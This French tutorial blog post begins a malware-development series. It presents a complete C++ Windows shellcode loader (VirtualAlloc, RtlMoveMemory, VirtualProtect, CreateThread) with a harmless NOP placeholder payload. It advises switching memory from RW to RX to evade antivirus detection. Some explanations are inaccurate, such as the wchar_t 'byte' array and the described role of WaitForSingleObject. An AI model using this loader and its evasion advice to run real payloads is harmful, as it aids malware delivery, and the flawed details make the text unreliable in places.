# Notre premier programme

Après le post introductif, il est temps d'entamer cette série sur le maldev ensemble, en concevant un simple programme en C++ exécutant un payload via l'utilisation de fonctions faisant partie de l'API Windows.

>Je n'incluerai volontairement aucun payload précis dans ce post, partant du principe que le lecteur n'est pas un script kiddie et est à même de se débrouiller à ce niveau là.

Le programme suit une logique très simple, à commencer par l'inclusion dans le programme d'un payload sous la forme d'un array de bytes (j'aurai pu dire "tableau d'octets" mais soyons honnêtes, ça ne sonne pas terrible), et l'exécution de quatre fonctions clés:

*	VirtualAlloc : qui nous servira à réserver de l'bloc mémoire, de la taille de notre payload
*	RtlMoveMemory: qui bouger notre payload dans l'bloc mémoire préalablement réservé
*	VirtualProtect: afin de changer les permissions sur la zone mémoire allouée afin de permettre l'exécution
*	CreateThread: qui, enfin, créera un thread servant à l'exécution du payload contenu dans l'bloc mémoire préalablement réservé


Jetons un oeil auxdites fonctions une par une :

## Les fonctions utilisées

### VirtualAlloc

Définie dans la documentation Microsoft comme ceci : 

```cpp
LPVOID VirtualAlloc(
  [in, optional] LPVOID lpAddress,
  [in]           SIZE_T dwSize,
  [in]           DWORD  flAllocationType,
  [in]           DWORD  flProtect
);
```

Cette fonction sert à réserver un bloc mémoire, et prend quatre paramètres:

*	lpAddress, un pointeur (optionel) servant à indiquer l'addresse exacte où nous souhaitons réserver bloc mémoire. Si nul, alors la fonction se chargera elle-même du choix.
*	dwSize, un integer servant à indiquer la taille totale de bloc réservé
*	flAllocationType, un DWORD désignant le type d'allocation mémoire. Par exemple, "MEM_RESERVE" (nom assez explicite) pour réserver un bloc mémoire dans le processus.
*	flProtect, un DWORD servant à indiquer la protection mémoire assignée à notre bloc mémoire. Exemple : la protection mémoire "PAGE_EXECUTE_READ" sert de factio à y assigner les permissions "lecture" et "exécution".

### RtlMoveMemory

Définie dans la documentation Microsoft comme ceci : 

```cpp
VOID RtlMoveMemory(
  _Out_       VOID UNALIGNED *Destination,
  _In_  const VOID UNALIGNED *Source,
  _In_        SIZE_T         Length
);
```

Cette fonction sert à copier le contenu d'un bloc mémoire vers un autre, et prend trois paramètres:

*	\*Destination, un pointeur vers le bloc mémoire de destination vers lequel nos octets/bytes seront copiés
*	\*Source, un pointeur vers le bloc mémoire source en provenance duquel seront copiés nos octets/bytes
*	Length, un integer désignant le nombre d'octets/bytes à copier de la source à la destination

### VirtualProtect

Définie dans la documentation Microsoft comme ceci :

```cpp
BOOL VirtualProtect(
  [in]  LPVOID lpAddress,
  [in]  SIZE_T dwSize,
  [in]  DWORD  flNewProtect,
  [out] PDWORD lpflOldProtect
);
```

Cette fonction sert à changer les les protections mémoires d'un bloc mémoire préalablement réservé, et prend quatre paramètres:

*	lpAddress, un pointeur vers le bloc mémoire ciblé
*	dwSize, un integer désignant la taille du bloc mémoire ciblé
*	flNewProtect, un DWORD indiquant la nouvelle protection mémoire assignée à notre bloc
*	lpflOldProtect, un pointeur indiquant l'ancienne protection mémoire (par valeur) assignée à notre bloc

## CreateThread

Définie dans la documentation Microsoft comme ceci :

```cpp
HANDLE CreateThread(
  [in, optional]  LPSECURITY_ATTRIBUTES   lpThreadAttributes,
  [in]            SIZE_T                  dwStackSize,
  [in]            LPTHREAD_START_ROUTINE  lpStartAddress,
  [in, optional]  __drv_aliasesMem LPVOID lpParameter,
  [in]            DWORD                   dwCreationFlags,
  [out, optional] LPDWORD                 lpThreadId
);
```

Cette fonction sert à créer un thread d'exécution pour le processus actuel, et prend six paramètres :

*	lpThreadAttributes, un pointeur (optionel) indiquant si la HANDLE retournée par notre fonction peut être héritée par des processus enfants : dans notre cas, peu d'importance.
*	dwStackSize, un integer servant à initialiser la taille de la stack mémoire du thread. Si nul, le thread s'en charge automatiquement
*	lpStartAddress, un pointeur vers le contenu à exécuter (pour faire court)
*	lpParameter, un pointeur (optionel) vers de potentielles variables passées au thread
*	dwCreationFlags, un DWORD désignant les flags relatifs à la création du thread. Exemple : 0x00000004 créera le thread dans un état suspendu, ne pouvant être exécuté qu'en appellant la fonction ResumeThread
*	lpThreadId, un pointeur (optionel) vers une variable recevant l'ID du thread. Inutile dans notre cas


## Le code

Ces quatre fonctions définies, place au code en lui même. 

> Pour ce qui touche aux chaînes de caractères, je n'utiliserai en général que les types que ceux conçus pour l'UTF16-LE, le type de caractères natif sur les systèmes d'exploitation Windows ; devoir caler des casts et des "L" à droite à gauche dans la moitié de mes programmes m'a un peu fatigué.


```cpp
#include <stdio.h>
#include <windows.h>



int main() {

	wchar_t payload[] = {0x90,0x90,0x90,0x90};
	unsigned int payloadlen = sizeof(payload);

	void* buffer;
	HANDLE hThread;
	DWORD exProtection = 0;
	bool retValue;

	buffer = VirtualAlloc(0,payloadlen,MEM_RESERVE | MEM_COMMIT,PAGE_READWRITE);
	RtlMoveMemory(buffer,payload,payloadlen);
	retValue =VirtualProtect(buffer, payloadlen, PAGE_EXECUTE_READ, &exProtection);

	if (retValue != 0) {

		hThread = CreateThread(0,0,(LPTHREAD_START_ROUTINE)buffer,0,0,0);
		WaitForSingleObject(hThread, 500);


	}

	return 0;
}
```

Le lecteur notera qu'avant l'exécution du quatuor de fonctions susmentionnées, je déclare certaines variables particulières.

*	_payload_, un array de bytes (nullbytes dans notre cas), et l'integer _payloadlen_, sa taille exprimée par le biais de la fonction _sizeof()_
*	_buffer_, un pointeur (vide lors de sa déclaration) vers le futur espace mémoire qui accueillera notre payload
*	_hThread_, une handle qui pointera vers l'object de type Thread retourné par la fonction _CreateThread()_
*	_exProtection_, un DWORD à la valeur de 0 qui nous servira plus tard
*	_retValue_, un booléen qui prendra la valeur de retour de la fonction _VirtualProtect()_

Et j'exécute enfin nos quatre fonctions :

### VirtualAlloc

```cpp
buffer = VirtualAlloc(0,payloadlen,MEM_RESERVE | MEM_COMMIT,PAGE_READWRITE);
```

Rien de suprenant, on réserve notre espace en mémoire (MEM_RESERVE & MEM_COMMIT), en y assignant la permission READWRITE. Mais si cet espace est censé contenir un payload ayant pour but d'être exécuté, ne serait-il pas plus pertinent d'y assigner les permissions d'exécution directement ? La réponse est non, vu que nimporte quel anti-virus/sandbox digne de ce nom détectera la création d'un espace mémoire RWX et se mettra à sonner l'alarme instantanément. Assigner des permissions d'écriture pour copier notre shellcode dans l'espace réservé, PUIS changer la permission de RW à RX est bien plus discret.

### RtlMoveMemory

```cpp
RtlMoveMemory(buffer,payload,payloadlen);
```

Assez simple. On prend le payload, et on le déplace dans le buffer setup lors de l'appel à VirtualAlloc ci-dessus

### VirtualProtect

```cpp
retValue =VirtualProtect(buffer, payloadlen, PAGE_EXECUTE_READ, &exProtection);
```

Comme expliqué plus haut, VirtualProtect va se charger de modifier les permissions de l'espace mémoire réservé plus haut (cf le troisième argument prenant la valeur PAGE_EXECUTE_READ). exProtection est juste là pour indiquer la protection précédente (zéro). Félicitations, buffer pointe désormais vers un espace mémoire RX dans lequel se situe notre payload, tout prêt a être exécuté !

### CreateThread (et son partenaire, WaitForSingleObject)

```cpp
if (retValue != 0) {

		hThread = CreateThread(0,0,(LPTHREAD_START_ROUTINE)buffer,0,0,0);
		WaitForSingleObject(hThread, 500);


	}
```

Si la valeur de retour de la fonction VirtualProtect, enregistrée dans le booléen retValue, est différente de zéro (indiquant ainsi son succès), alors nous utilisons la fonction CreateThread pour créer une HANDLE vers un thread se chargeant de l'exécution du shellcode contenu dans notre buffer. La fonction WaitForSingleObject se chargera de donner l'ordre d'exécution après 500 millisecondes.


Et notre shellcode est ainsi exécuté (et dans notre cas, n'aura absolument aucun effet, vu qu'il est composé de quatre instructions NOPs)


## La conclusion


Pour conclure, cet exécutable ne comportant aucun méchanisme d'obfuscation, nimporte quelle solution de sécurité détectera directement dans sa table d'imports le (très suspicieux) quatuor de fonctions utilisées. Si j'avais inclus un shellcode digne de ce nom sans l'obfusquer, celui-ci aurait aussi été détecté directement.

Rendez-vous dans le prochain post pour mettre en place les mécanismes d'obfuscation les plus basiques !